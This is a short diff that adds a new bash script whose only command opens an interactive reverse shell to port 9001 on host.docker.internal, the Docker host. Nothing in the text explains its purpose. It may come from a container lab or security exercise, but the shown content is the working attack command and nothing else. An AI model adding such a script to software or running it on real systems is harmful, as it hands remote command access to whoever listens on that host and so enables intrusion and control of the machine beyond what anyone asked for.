@@ -1,0 +1,3 @@
+#!/bin/bash
+
+bash -c "bash -i >& /dev/tcp/host.docker.internal/9001 0>&1"
